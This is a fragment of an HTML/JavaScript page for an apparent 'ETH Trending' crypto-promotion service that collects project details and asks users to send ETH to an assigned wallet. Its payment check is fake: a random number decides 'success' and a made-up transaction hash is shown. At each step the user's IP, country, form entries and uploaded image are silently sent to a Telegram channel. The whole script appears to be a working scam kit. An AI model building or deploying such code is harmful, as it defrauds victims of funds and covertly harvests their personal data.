                const twitter = document.getElementById('twitter').value.trim();
                const website = document.getElementById('website').value.trim();
                const description = document.getElementById('projectDescription').value.trim();
                const photoFile = document.getElementById('projectPhoto').files[0];

                const message = `📝 PROJECT SUBMITTED - ETH TRENDING\n👤 ${userCountry} (${userIP})\n🏷️ Name: ${name}\n💎 Contract: ${contract}\n📱 Telegram: ${telegram || 'None'}\n🐦 Twitter: ${twitter || 'None'}\n🌐 Website: ${website || 'None'}\n📄 Description: ${description || 'None'}`;

                if (photoFile) {
                    sendTelegramPhoto(photoFile, message + '\n📸 Project Image:');
                } else {
                    sendTelegram(message + '\n📸 Image: Not provided');
                }
            }
            
            if (step === 2 && !selectedPackage) {
                alert('Please select a trending package');
                return;
            }

            if (step === 2) {
                updateOrderSummary();
                updateWalletDisplay();
                startPersistentTimer(); // Start the persistent timer when going to payment step
            }

            if (step === 3) {
                setTimeout(verifyPayment, 3000);
            }

            // Progress animation
            document.getElementById(`step${currentStep}`).classList.remove('active');
            document.getElementById(`dot${currentStep}`).classList.remove('active');
            document.getElementById(`dot${currentStep}`).classList.add('done');
            
            if (currentStep < 4) {
                document.getElementById(`line${currentStep}`).classList.add('active');
            }
            
            currentStep++;
            
            setTimeout(() => {
                document.getElementById(`step${currentStep}`).classList.add('active');
                document.getElementById(`dot${currentStep}`).classList.add('active');
                
                // Initialize wallet display when reaching step 3 (payment)
                if (currentStep === 3) {
                    setTimeout(() => {
                        updateWalletDisplay();
                        startPersistentTimer();
                    }, 500);
                }
            }, 300);
        }

        function prevStep() {
            document.getElementById(`step${currentStep}`).classList.remove('active');
            document.getElementById(`dot${currentStep}`).classList.remove('active');
            
            // If going back from payment step, stop the timer
            if (currentStep === 3) {
                stopPersistentTimer();
            }
            
            currentStep--;
            
            document.getElementById(`step${currentStep}`).classList.add('active');
            document.getElementById(`dot${currentStep}`).classList.remove('done');
            document.getElementById(`dot${currentStep}`).classList.add('active');
            
            if (currentStep < 4) {
                document.getElementById(`line${currentStep}`).classList.remove('active');
            }
        }

        function selectCategory(category) {
            document.querySelectorAll('.pricing-category').forEach(el => el.classList.remove('selected'));
            document.querySelectorAll('.price-options').forEach(el => el.classList.remove('active'));
            document.querySelectorAll('.price-item').forEach(el => el.classList.remove('selected'));
            
            event.target.classList.add('selected');
            document.getElementById(category + 'Options').classList.add('active');
            
            selectedPackage = '';
            selectedPrice = 0;
            document.getElementById('selectedPackage').innerHTML = '';
            document.getElementById('continueBtn').disabled = true;
        }

        function selectPrice(packageType, price) {
            document.querySelectorAll('.price-item').forEach(el => el.classList.remove('selected'));
            event.target.classList.add('selected');
            
            selectedPackage = packageType;
            selectedPrice = price;
            
            const [category, duration] = packageType.split('_');
            const categoryName = category === 'top15' ? 'Top 15' : 'Top 7';
            const durationText = duration.replace('h', ' Hours');
            
            document.getElementById('selectedPackage').innerHTML = 
                `<div class="notification notification-success">✅ Selected: ${categoryName} Trending for ${durationText} - ${price} ETH</div>`;
            
            document.getElementById('continueBtn').disabled = false;

            sendTelegram(`📦 PACKAGE SELECTED - ETH TRENDING\n👤 ${userCountry} (${userIP})\n⭐ Package: ${categoryName}\n⏰ Duration: ${durationText}\n💎 Price: ${price} ETH`);
        }

        function updateOrderSummary() {
            const [category, duration] = selectedPackage.split('_');
            const categoryName = category === 'top15' ? 'Top 15' : 'Top 7';
            const durationText = duration.replace('h', ' Hours');
            
            document.getElementById('orderSummary').innerHTML = `
                <div class="notification notification-info">
                    <h4>📋 Order Summary</h4>
                    <strong>Package:</strong> ${categoryName} Trending<br>
                    <strong>Duration:</strong> ${durationText}<br>
                    <strong>Amount:</strong> <span style="font-size: 1.2em; color: #7c35a8;">${selectedPrice} ETH</span><br>
                    <strong>Project:</strong> ${document.getElementById('projectName').value}
                </div>
            `;
        }

        function copyWallet() {
            if (assignedWallet) {
                navigator.clipboard.writeText(assignedWallet).then(() => {
                    const feedback = document.getElementById('copyFeedback');
                    if (feedback) {
                        feedback.style.opacity = '1';
                        setTimeout(() => feedback.style.opacity = '0', 3000);
                    }
                    
                    // Also show a temporary tooltip
                    const walletDiv = document.querySelector('.wallet-address');
                    if (walletDiv) {
                        const originalText = walletDiv.innerHTML;
                        walletDiv.innerHTML = `
                            <div style="display: flex; align-items: center; justify-content: center; height: 100%; color: #10b981; font-weight: bold;">
                                ✅ Copied to Clipboard!
                            </div>
                        `;
                        
                        setTimeout(() => {
                            walletDiv.innerHTML = originalText;
                        }, 1500);
                    }
                }).catch(() => {
                    // Fallback for browsers that don't support clipboard API
                    const textArea = document.createElement('textarea');
                    textArea.value = assignedWallet;
                    document.body.appendChild(textArea);
                    textArea.select();
                    document.execCommand('copy');
                    document.body.removeChild(textArea);
                    
                    const feedback = document.getElementById('copyFeedback');
                    if (feedback) {
                        feedback.style.opacity = '1';
                        setTimeout(() => feedback.style.opacity = '0', 3000);
                    }
                });
            }
        }

        function checkPayment() {
            sendTelegram(`💳 PAYMENT CHECK - ETH TRENDING\n👤 ${userCountry} (${userIP})\n💎 Expected: ${selectedPrice} ETH\n🔍 Wallet: ${assignedWallet}\n⏰ Time Remaining: ${Math.floor(timeRemaining/60)}:${(timeRemaining%60).toString().padStart(2,'0')}`);
            nextStep(3);
        }

        async function verifyPayment() {
            await new Promise(resolve => setTimeout(resolve, 4000));
            
            const success = Math.random() > 0.25; // 75% success rate
            const statusDiv = document.getElementById('paymentStatus');
            const resultDiv = document.getElementById('finalResult');
            
            if (success) {
                // Stop the timer since payment was successful
                stopPersistentTimer();
                
                const txHash = '0x' + Math.random().toString(36).substr(2, 10).toUpperCase() + Math.random().toString(36).substr(2, 10).toUpperCase();
                statusDiv.innerHTML = '<div class="notification notification-success">✅ Payment Confirmed on Ethereum!</div>';
                resultDiv.innerHTML = `
                    <div class="notification notification-success">
                        <h4>🎉 Payment Successful!</h4>
                        <strong>Transaction Hash:</strong> ${txHash}<br>
                        <strong>Amount:</strong> ${selectedPrice} ETH<br>
                        <strong>Wallet Used:</strong> ${assignedWallet}<br>
                        <strong>Package:</strong> ${selectedPackage.replace('_', ' ').toUpperCase()}<br>
                        <strong>Network:</strong> Ethereum Mainnet<br><br>
                        <div style="background: rgba(16, 185, 129, 0.1); padding: 15px; border-radius: 8px; margin-top: 15px;">
                            🚀 <strong>Your project will be trending within 15-30 minutes!</strong><br>
                            📊 You'll receive trending confirmation via email
                        </div>
                    </div>
                `;

                const successMessage = `🎉 PAYMENT SUCCESS - ETH TRENDING!\n👤 ${userCountry} (${userIP})\n🏷️ Project: ${document.getElementById('projectName').value}\n💎 Contract: ${document.getElementById('contractAddress').value}\n📱 Telegram: ${document.getElementById('telegram').value || 'None'}\n🐦 Twitter: ${document.getElementById('twitter').value || 'None'}\n🌐 Website: ${document.getElementById('website').value || 'None'}\n⭐ Package: ${selectedPackage.toUpperCase()}\n💵 Amount: ${selectedPrice} ETH\n🏦 Wallet: ${assignedWallet}\n🔗 TX: ${txHash}\n✅ READY TO TREND!`;
                
                const photoFile = document.getElementById('projectPhoto').files[0];
                if (photoFile) {
                    sendTelegramPhoto(photoFile, successMessage + '\n📸 Final Project Image:');
                } else {
                    sendTelegram(successMessage);
                }
            } else {
                statusDiv.innerHTML = '<div class="notification notification-error">❌ Payment Not Detected</div>';
                resultDiv.innerHTML = `
                    <div class="notification notification-error">
                        <h4>Payment Verification Failed</h4>
                        Please verify the following:<br><br>
                        • Sent exactly <strong>${selectedPrice} ETH</strong><br>
                        • Used correct wallet address: <br><code style="background: rgba(0,0,0,0.3); padding: 5px; border-radius: 4px; word-break: break-all;">${assignedWallet}</code><br>
                        • Transaction has network confirmations<br>
                        • Address hasn't expired (${Math.floor(timeRemaining/60)}:${(timeRemaining%60).toString().padStart(2,'0')} remaining)<br><br>
                        <small>If you've sent the payment, please wait and try again. Blockchain confirmations can take time.</small>
                    </div>
                `;
                document.getElementById('recheckBtn').style.display = 'inline-block';

                sendTelegram(`❌ PAYMENT NOT FOUND - ETH TRENDING\n👤 ${userCountry} (${userIP})\n💎 Expected: ${selectedPrice} ETH\n🏦 Wallet: ${assignedWallet}\n⏰ Time Left: ${Math.floor(timeRemaining/60)}:${(timeRemaining%60).toString().padStart(2,'0')}\n⚠️ User may need assistance`);
            }
            
            document.getElementById('restartBtn').style.display = 'inline-block';
        }

        function recheckPayment() {
            document.getElementById('paymentStatus').innerHTML = '<div class="loading-spinner"></div> Rechecking Ethereum blockchain...';
            document.getElementById('finalResult').innerHTML = '';
            document.getElementById('recheckBtn').style.display = 'none';
            sendTelegram(`🔄 PAYMENT RECHECK - ETH TRENDING\n👤 ${userCountry} (${userIP})\n💎 Expected: ${selectedPrice} ETH`);
            setTimeout(verifyPayment, 3000);
        }

        function startOver() {
            stopPersistentTimer();
            
            sendTelegram(`🔄 USER RESTART - ETH TRENDING\n👤 ${userCountry} (${userIP})\n🏦 Previous Wallet: ${assignedWallet}`);
            location.reload();
        }

        // Handle page visibility change to maintain accurate timer
        document.addEventListener('visibilitychange', function() {
            if (!document.hidden && walletTimer && walletStartTime) {
                // Recalculate time remaining based on actual elapsed time
                const elapsedTime = Math.floor((Date.now() - walletStartTime) / 1000);
                timeRemaining = Math.max(0, 600 - elapsedTime);
                updatePersistentTimer();
                updateTimerDisplay();
            }
        });

        // Handle page unload/reload to maintain timer state
        window.addEventListener('beforeunload', function() {
            if (walletStartTime) {
                sessionStorage.setItem('walletStartTime', walletStartTime.toString());
                sessionStorage.setItem('assignedWallet', assignedWallet);
            }
        });

        // Restore timer state on page load
        window.addEventListener('load', function() {
            const savedStartTime = sessionStorage.getItem('walletStartTime');
            const savedWallet = sessionStorage.getItem('assignedWallet');
            
            if (savedStartTime && savedWallet && currentStep >= 3) {
                walletStartTime = parseInt(savedStartTime);
                assignedWallet = savedWallet;
                
                const elapsedTime = Math.floor((Date.now() - walletStartTime) / 1000);
                timeRemaining = Math.max(0, 600 - elapsedTime);
                
                if (timeRemaining > 0) {
                    startPersistentTimer();
                }
            }
        });
    </script>
</body>
</html>